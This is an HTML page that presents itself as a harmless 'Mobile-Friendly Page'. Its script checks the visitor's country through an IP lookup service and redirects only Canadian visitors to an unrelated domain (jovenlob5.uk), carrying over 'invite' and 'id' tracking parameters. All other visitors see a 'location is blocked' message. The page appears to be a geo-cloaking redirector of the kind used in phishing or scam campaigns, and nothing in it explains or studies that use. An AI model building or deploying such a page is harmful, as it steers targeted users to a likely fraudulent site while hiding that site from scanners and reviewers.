<!DOCTYPE html>
  <html>
	<head>
	  <title>Mobile-Friendly Page</title>
<style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
    }
    
    #loading {
      display: none;
    }
</style>
	</head>
	<body>
	  <h1>Welcome to My Page!</h1>
	  <div id="loading">
		<h2>Loading...</h2>
	  </div>

<script>
    // Function to retrieve query parameters from the URL
    function getQueryParameter(name) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(name);
    }

    // Function to redirect to a different URL
    function redirectTo(url) {
      window.location.href = url;
    }

    // Function to handle the logic based on the client's IP
    function handleIP(clientIP) {
      const invite = getQueryParameter('invite');
      const id = getQueryParameter('id');

      if (clientIP === 'Canada') {
        const redirectURL = `https://jovenlob5.uk?invite=${invite}&id=${id}`;
        redirectTo(redirectURL);
      } else {
        const blockedMessage = document.createElement('p');
        blockedMessage.textContent = 'Your location is blocked.';
        document.body.appendChild(blockedMessage);
      }

      // Hide the loading message
      const loadingDiv = document.getElementById('loading');
      loadingDiv.style.display = 'none';
    }

    // Function to make a GET request to retrieve the client's IP
    function getClientIP() {
      const url = 'https://api.myip.com';

      const xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
		  alert("ok");
            const response = JSON.parse(xhr.responseText);
            const clientIP = response.country;

            handleIP(clientIP);
          } else {
            console.error('Failed to retrieve client IP');
          }
        }
      };

      xhr.open('GET', url, true);
      xhr.send();
    }

    // Show the loading message
    const loadingDiv = document.getElementById('loading');
    loadingDiv.style.display = 'block';

    // Call the function to retrieve the client's IP
    getClientIP();
</script>
	</body>
  </html>


